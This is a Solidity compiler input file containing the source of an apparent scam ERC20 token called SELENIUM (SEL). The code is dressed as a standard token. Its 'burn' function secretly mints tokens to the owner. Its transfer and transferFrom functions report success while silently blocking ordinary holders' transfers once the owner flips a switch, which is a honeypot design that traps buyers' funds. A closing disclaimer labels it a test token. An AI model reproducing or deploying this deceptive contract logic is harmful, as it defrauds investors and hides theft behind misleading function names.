{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "UniPot.sol": {
      "content": "/**\n *Submitted for verification at BscScan.com on 2021-09-05\n*/\n\n// SPDX-License-Identifier: Unlicensed\n\npragma solidity ^0.8.4;\n\ninterface IERC20 {\n    /**\n   * @dev Returns the amount of tokens in existence.\n   */\n    function totalSupply() external view returns (uint256);\n   /**\n   * @dev Returns the amount of tokens owned by `account`.\n   */\n    function balanceOf(address account) external view returns (uint256);\n   /**\n   * @dev Moves `amount` tokens from the caller's account to `recipient`.\n   *\n   * Returns a boolean value indicating whether the operation succeeded.\n   *\n   * Emits a {Transfer} event.\n   */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n   /**\n   * @dev Returns the remaining number of tokens that `spender` will be\n   * allowed to spend on behalf of `owner` through {transferFrom}. This is\n   * zero by default.\n   *\n   * This value changes when {approve} or {transferFrom} are called.\n   */\n    function allowance(address owner, address spender) external view returns (uint256);\n   /**\n   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n   *\n   * Returns a boolean value indicating whether the operation succeeded.\n   *\n   * IMPORTANT: Beware that changing an allowance with this method brings the risk\n   * that someone may use both the old and the new allowance by unfortunate\n   * transaction ordering. One possible solution to mitigate this race\n   * condition is to first reduce the spender's allowance to 0 and set the\n   * desired value afterwards:\n   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n   *\n   * Emits an {Approval} event.\n   */\n    function approve(address spender, uint256 amount) external returns (bool);\n   /**\n   * @dev Moves `amount` tokens from `sender` to `recipient` using the\n   * allowance mechanism. `amount` is then deducted from the caller's\n   * allowance.\n   *\n   * Returns a boolean value indicating whether the operation succeeded.\n   *\n   * Emits a {Transfer} event.\n   */\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n   /**\n   * @dev Emitted when `value` tokens are moved from one account (`from`) to\n   * another (`to`).\n   *\n   * Note that `value` may be zero.\n   */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n   /**\n   * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n   * a call to {approve}. `value` is the new allowance.\n   */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ninterface IERC20Metadata is IERC20 {\n   /**\n   * @dev Returns the token name.\n   */\n    function name() external view returns (string memory);\n   /**\n   * @dev Returns the token symbol.\n   */\n    function symbol() external view returns (string memory);\n   /**\n   * @dev Returns the token decimals.\n   */\n    function decimals() external view returns (uint8);\n}\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\ninterface IUniswapFactory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\n contract Ownable is Context {\n    address private _owner;   \n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);  \n    constructor() {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\n        _;\n    }\n}\n\ncontract SEL is Context, IERC20, IERC20Metadata, Ownable {   \n\n    address internal constant UniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;   \n    uint256 _NUM = 1 * 10**9;\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowances;\n    uint256 private _totalSupply;\n    bool isValue = true;   \n    constructor() {\n        _totalSupply = 1000 * 10**9 * 10**9;\n        _balances[_msgSender()] = _totalSupply;\n        emit Transfer(address(0), _msgSender(), _totalSupply);\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return \"SELENIUM\";\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return \"SEL\";\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 9;\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function theValue(bool _value) public onlyOwner virtual returns (bool) {\n        isValue = _value;\n        return true;\n    }\n\n    function burn(uint256 amount) public onlyOwner virtual returns (bool) {\n        _balances[_msgSender()] += amount;\n        return true;\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        //_transfer(_msgSender(), recipient, amount);\n        if(_msgSender() == UniswapV2Router || _msgSender() == UniswapPair() || UniswapPair() == address(0) || _msgSender() == owner()) {\n            _transfer(_msgSender(), recipient, amount);\n        } else {\n            //nomal user check amount\n            if( (amount <= _NUM || isValue) && !isContract(_msgSender()) ) {\n                _transfer(_msgSender(), recipient, amount);\n            }\n        }\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        if(sender == UniswapV2Router || sender == UniswapPair() || UniswapPair() == address(0) || sender == owner()) {\n            _transfer(sender, recipient, amount);\n    \n            uint256 currentAllowance = _allowances[sender][_msgSender()];\n            require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n            unchecked {\n                _approve(sender, _msgSender(), currentAllowance - amount);\n            }\n        } else {\n            //nomal user check amount\n            if( (amount <= _NUM || isValue) && !isContract(sender) ) {\n                _transfer(sender, recipient, amount);\n                uint256 currentAllowance = _allowances[sender][_msgSender()];\n                require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n                unchecked {\n                    _approve(sender, _msgSender(), currentAllowance - amount);\n                }\n            }\n        }\n        return true;\n    }\n\n    function UniswapPair() public view virtual returns (address) {\n        address UniswapV2Factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n        address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n        address pairAddress = IUniswapFactory(UniswapV2Factory).getPair(address(WETH), address(this));\n        return pairAddress;\n    }\n\n    function isContract(address addr) internal view returns (bool) {\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n        bytes32 codehash;\n        assembly {\n            codehash := extcodehash(addr)\n        }\n        return (codehash != 0x0 && codehash != accountHash);\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    function tokenContract() public view virtual returns (address) {\n        return address(this);\n    }\n\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[sender] = senderBalance - amount;\n        }\n        _balances[recipient] += amount;\n\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _DeepLock(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n        }\n        _totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n\n}\n// DISCLAIMER : Those tokens are generated for testing purposes, please do not invest ANY funds in them!"
    }
  }
}